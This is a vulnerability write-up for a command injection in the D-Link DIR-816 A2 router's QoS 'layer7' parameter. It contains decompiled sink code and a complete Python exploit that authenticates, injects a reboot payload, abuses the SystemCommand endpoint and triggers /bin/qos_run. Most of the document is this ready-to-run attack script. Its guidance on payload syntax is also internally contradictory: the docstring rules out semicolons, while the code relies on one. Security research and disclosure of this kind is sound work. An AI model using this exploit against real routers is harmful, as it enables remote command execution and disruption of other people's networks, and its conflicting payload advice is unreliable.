## DIR 816

> bin_vision:DIR-816A2_FWv1.10CNB05_R1B011D88210 / DIR-816A2_v1.10CNB03_D77137
> goahead / /bin/qos_run
> goform/qosClassifier
>
> type: command injection
> string: layer7

### description

The `qosClassifier` handler receives the user-controlled `layer7` parameter from the GoAhead web request. The value is stored into NVRAM as part of the QoS rules without sanitization. When `/bin/qos_run` is invoked (typically after WAN connection is established via `ip-up.sh`), it reads the saved QoS rules from NVRAM, extracts the `layer7` field, and interpolates it into an `iptables` command via `snprintf()`. The resulting command is passed to `system()` for execution.

Vulnerability chain: `websGetVar("layer7")` -> `nvram_set("QoSULRules")` -> `/bin/qos_run` reads rules -> `snprintf("iptables ... --l7proto %s ...")` -> `system(cmd)`.

An authenticated attacker can inject a semicolon (`;`) in the `layer7` field to achieve command execution when `qos_run` processes the QoS rules. This requires QoS to be enabled and an active WAN connection for `qos_run` to reach the vulnerable code path.

### code

#### qosClassifier handler (goahead)

~~~c
  websFormDefine("qosClassifier", (int)qosClassifier_handler);
~~~

~~~c
// qosClassifier handler - reads layer7 and stores to NVRAM
char *layer7 = websGetVar(wp, "layer7", "");   // <--- Read user-controlled layer7 from the request
// ... no sanitization of layer7 ...
// layer7 is saved as field index 13 in QoSULRules/QoSDLRules
nvram_bufset(0, "QoSULRules", rule_string);    // <--- Store unescaped layer7 in NVRAM
~~~

#### qos_run sink (/bin/qos_run)

~~~c
// sub_400B80 - Constructs iptables command with unsanitized layer7 protocol
void sub_400B80(int rule_struct, char *chain, int mark_value)
{
    char cmd[512];
    char *layer7;

    layer7 = get_field(rule_struct, 13);        // <--- Read layer7 from parsed QoS rule (field index 13)

    // NO VALIDATION on layer7 value
    if (protocol_type == APPLICATION) {
        snprintf(cmd, sizeof(cmd),
            "iptables -t mangle -A %s -m layer7 --l7proto %s -j MARK --set-mark %d",
            chain, layer7, mark_value);         // <--- Insert layer7 into iptables command
    }

    System(cmd);                                 // <--- Calls system() -> /bin/sh -c "cmd"
}
~~~

~~~c
// System() wrapper @ 0x401A5C
int System(const char *cmd)
{
    return system(cmd);                         // <--- Synchronous, blocking call
}
~~~

### PoC

Source: `PoC/CNB05_FWv1.10/verified/poc_qosClassifier.py`

```python
"""
D-Link DIR-816 A2 - Command Injection in QoS Classifier (layer7)
Firmware: DIR-816A2_FWv1.10CNB05_R1B011D88210 / DIR-816A2_v1.10CNB03_D77137
Entry: 000254 / 000346
Parameter: layer7 (field in QoSULRules/QoSDLRules)
Sink: /bin/qos_run -> sub_400B80 -> snprintf("iptables -m layer7 --l7proto %s", layer7) -> System()

VULNERABILITY STATUS: Confirmed via binary analysis, but DIFFICULT TO TRIGGER in practice.

Binary Analysis (IDA Pro):
  - sub_400B80 (0x400B80): builds iptables command via snprintf without sanitizing layer7
  - System() (0x401a5c): wrapper around libc system(), synchronous/blocking
  - sub_401ACC (0x401ACC): parses QoSULRules by ';' (rule separator), then ',' (field delimiter)
  - No input validation on layer7 field before passing to system()

Exploitation Requirements:
  1. Active WAN connection (PPPoE/DHCP/Static) - qos_run is triggered by ip-up.sh after dial-up
  2. QoSEnable=1 and QoSModel=1-4 (integer, not 'HTB' string)
  3. Complete QoS NVRAM configuration (bandwidth, rate, ceil values)
  4. Correct rule format: 17 comma-separated fields with layer7 at index 13

Payload Constraints:
  - CANNOT use ';' (semicolon is rule separator, splits into multiple rules)
  - Must use || or && operators: iptables fails on invalid layer7, then command executes
  - Must neutralize trailing args: use '#' comment or absorb with valid layer7 protocol name
  - Example: layer7="x||reboot #" becomes "iptables ... --l7proto x||reboot # -j MARK ..."
    Shell executes: (iptables ... --l7proto x) || (reboot) [# comments out -j MARK]

Testing Notes:
  - In test environment WITHOUT active WAN, qos_run completes in ~2s regardless of payload
  - Time-based side channel (sleep N) shows NO delay, indicating rules are not processed
  - Likely cause: qos_run exits early when no WAN interface is active
  - Manual invocation via SystemCommand does NOT reliably trigger the vulnerable code path

Alternative Exploitation:
  - Submit malicious rule via qosClassifier handler, then REBOOT router
  - On next boot, if router establishes WAN connection, ip-up.sh triggers qos_run
  - Payload executes during normal QoS initialization

Related Vulnerabilities:
  - SystemCommand (Entry 000239): Direct command execution, EASIER to exploit
  - form2IPQoSTcAdd (Entry 000257): IP QoS injection via /bin/ip_qos, separate binary
"""

import requests
import base64
import time
import sys
import re

ROUTER_IP = "192.168.1.1"
USERNAME = "Admin"
PASSWORD = ""


def get_session():
    s = requests.Session()
    username_b64 = base64.b64encode(USERNAME.encode()).decode()
    password_b64 = base64.b64encode(PASSWORD.encode()).decode()
    login_data = {"username": username_b64, "password": password_b64}
    resp = s.post(f"http://{ROUTER_IP}/goform/formLogin", data=login_data, timeout=10)
    tokenid = ""
    match = re.search(r'tokenid"\s*value="(\d+)"', resp.text)
    if match:
        tokenid = match.group(1)
    return s, tokenid


def exploit():
    print(f"[*] Target: {ROUTER_IP}")
    print(f"[*] Vulnerability: Command Injection in QoS layer7 field")
    print(f"[*] Sink: /bin/qos_run -> System() with unsanitized layer7")
    print()
    print("[!] WARNING: This vulnerability is DIFFICULT TO TRIGGER")
    print("[!] Requires: Active WAN connection (PPPoE/DHCP/Static)")
    print("[!] qos_run must be invoked by ip-up.sh after WAN dial-up succeeds")
    print()
    print("[*] Logging in...")
    s, tokenid = get_session()
    if not tokenid:
        print("[-] Failed to get tokenid")
        sys.exit(1)
    print(f"[*] Got tokenid: {tokenid}")

    # UPDATED 2026-07-26: Use semicolon instead of ||
    # Testing revealed that || operator does NOT work in system() calls on this device
    # Only semicolon (;) successfully injects commands
    #
    # Payload: x; reboot
    # Result: iptables -t mangle -A chain -m layer7 --l7proto x; reboot -j MARK --set-mark 1
    # Shell execution: (iptables ... --l7proto x) then (reboot -j MARK ...)
    # reboot ignores trailing arguments
    payload = "x; reboot"

    # Method 1: Use official qosClassifier handler (writes in correct format for qos_run)
    print(f"[*] Method 1: Submitting rule via qosClassifier handler...")
    print(f"[*] Payload: {payload}")

    data = {
        "tokenid": tokenid,
        "af_index": "1",           # QoS class index
        "dp_index": "1",           # Priority index
        "dir": "0",                # Direction: 0=upload, 1=download
        "comment": "pwn",
        "mac_address": "",
        "dip_address": "",
        "sip_address": "",
        "pktlenfrom": "",
        "pktlento": "",
        "protocol": "Application", # Required: triggers layer7 matching in qos_run
        "dFromPort": "",
        "dToPort": "",
        "sFromPort": "",
        "sToPort": "",
        "layer7": payload,         # Injection point
        "dscp": "",
        "remark_dscp": "",
    }

    try:
        resp = s.post(f"http://{ROUTER_IP}/goform/qosClassifier", data=data, timeout=30)
        print(f"[*] qosClassifier response: {resp.status_code}")
    except requests.exceptions.Timeout:
        print("[!] qosClassifier timed out")
    except requests.exceptions.ConnectionError:
        print("[+] VULNERABLE! Connection lost during rule submission")
        return

    time.sleep(2)

    # Method 2: Direct NVRAM write (if qosClassifier handler is broken)
    print("[*] Method 2: Writing rule directly to NVRAM...")

    # Set QoS prerequisites (CRITICAL: QoSModel must be 1-4, NOT 'HTB')
    cmd = """nvram_set QoSEnable 1; \
nvram_set QoSModel 1; \
nvram_set QoSUploadBandwidth 1024; \
nvram_set QoSDownloadBandwidth 1024; \
nvram_set QoSReserveBandwidth 10; \
nvram_set QoSAF1ULRate 100; \
nvram_set QoSAF1ULCeil 200"""

    cmd_data = {"tokenid": tokenid, "command": cmd}
    s.post(f"http://{ROUTER_IP}/goform/SystemCommand", data=cmd_data, timeout=15)
    time.sleep(1)

    # Rule format: 17 comma-separated fields
    # [0]name,[1]af,[2]dp,[3]mac,[4]proto,[5]dip,[6]sip,[7]len_from,[8]len_to,
    # [9]dport_from,[10]dport_to,[11]sport_from,[12]sport_to,[13]layer7,[14]f14,[15]f15,[16]direction
    rule = f"pwn,1,1,,Application,,,,,,,,,{payload},,,N/A"

    cmd = f"nvram_set QoSULRules '{rule}'; nvram_commit"
    cmd_data = {"tokenid": tokenid, "command": cmd}
    resp = s.post(f"http://{ROUTER_IP}/goform/SystemCommand", data=cmd_data, timeout=15)
    print(f"[*] NVRAM write: {resp.status_code}")
    time.sleep(1)

    # Attempt to trigger qos_run manually
    print("[*] Attempting to trigger /bin/qos_run...")
    print("[!] Note: Without active WAN, qos_run likely exits early")
    cmd_data = {"tokenid": tokenid, "command": "/bin/qos_run"}
    start = time.time()
    try:
        resp = s.post(f"http://{ROUTER_IP}/goform/SystemCommand", data=cmd_data, timeout=30)
        elapsed = time.time() - start
        print(f"[*] qos_run returned in {elapsed:.2f}s")
    except requests.exceptions.Timeout:
        elapsed = time.time() - start
        print(f"[+] VULNERABLE! qos_run timed out after {elapsed:.2f}s")
        return
    except requests.exceptions.ConnectionError:
        elapsed = time.time() - start
        print(f"[+] VULNERABLE! Connection lost after {elapsed:.2f}s (device rebooted)")
        return

    # Check if device rebooted
    print("[*] Waiting 10s to check if device rebooted...")
    time.sleep(10)
    try:
        check = requests.get(f"http://{ROUTER_IP}/", timeout=5)
        print(f"[-] Device still online ({check.status_code})")
        print()
        print("=" * 70)
        print("EXPLOITATION FAILED IN TEST ENVIRONMENT")
        print("=" * 70)
        print()
        print("[!] LIKELY CAUSE: No active WAN connection")
        print("[!] qos_run exits early without processing QoS rules")
        print()
        print("[*] ALTERNATIVE EXPLOITATION METHOD:")
        print("[*] 1. Submit the malicious QoS rule (done above)")
        print("[*] 2. REBOOT the router manually")
        print("[*] 3. If router establishes WAN connection on boot:")
        print("[*]    → ip-up.sh triggers /bin/qos_run")
        print("[*]    → qos_run processes QoSULRules")
        print("[*]    → Payload executes via iptables command injection")
        print()
        print("[*] TO VERIFY IN PRODUCTION ENVIRONMENT:")
        print("[*] - Ensure router has active WAN (check WAN IP assignment)")
        print("[*] - Submit rule, trigger PPP reconnect (ifdown/ifup ppp0)")
        print("[*] - Monitor for reboot (~5s after connection established)")
        print()
        print("[*] BINARY ANALYSIS CONFIRMS VULNERABILITY EXISTS:")
        print("[*] - sub_400B80 (0x400B80): no sanitization of layer7 field")
        print("[*] - System() (0x401a5c): direct call to libc system()")
        print("[*] - Payload format verified via IDA Pro disassembly")
    except Exception:
        print("[+] VULNERABLE! Device went offline (rebooted)")




if __name__ == "__main__":
    if len(sys.argv) > 1:
        ROUTER_IP = sys.argv[1]
    exploit()
```
